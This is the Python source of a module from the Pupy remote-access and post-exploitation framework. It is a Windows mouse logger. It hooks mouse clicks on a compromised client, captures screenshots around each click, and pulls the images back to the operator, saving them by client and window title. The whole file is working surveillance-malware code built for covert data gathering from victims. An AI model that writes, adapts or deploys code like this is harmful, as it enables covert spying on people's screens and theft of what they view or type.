# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser

MOUSELOGGER_EVENT = 0x12000001

__class_name__ = 'MouseLoggerModule'
__events__ = {
    MOUSELOGGER_EVENT: 'keylogger'
}


@config(compat="windows", cat="gather")
class MouseLoggerModule(PupyModule):
    ''' log mouse clicks and take screenshots of areas around it '''
    # WARNING : screenshots are kept in memory before beeing dumped
    # TODO change that and add a callback to automatically send back
    # screenshots without need for dumping

    unique_instance = True
    dependencies = ['pupwinutils.mouselogger', 'png', 'pupwinutils.hookfuncs']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(
            prog='mouselogger', description=cls.__doc__
        )

        cls.arg_parser.add_argument(
            'action', choices=['start', 'stop', 'dump']
        )

    def run(self, args):
        if args.action == 'start':
            mouselogger_start = self.client.remote(
                'pupwinutils.mouselogger', 'mouselogger_start', False
            )
            mouselogger_start(event_id=MOUSELOGGER_EVENT)

        elif args.action == 'dump':
            self.success("dumping recorded mouse clicks :")
            mouselogger_dump = self.client.remote(
                'pupwinutils.mouselogger', 'mouselogger_dump'
            )
            screenshots_list = mouselogger_dump()

            for d, height, width, exe, win_title, buf in screenshots_list:
                try:
                    filepath = self.config.get_file('mouseshots', {
                        '%c': self.client.short_name(),
                        '%w': win_title
                    })

                    with open(filepath, 'wb') as output:
                        output.write(buf)
                        self.info("screenshot saved to {}".format(filepath))

                except Exception as e:
                    self.error('Error saving a screenshot: {}'.format(e))

        elif args.action == 'stop':
            mouselogger_stop = self.client.remote(
                'pupwinutils.mouselogger', 'mouselogger_stop', False
            )
            mouselogger_stop()
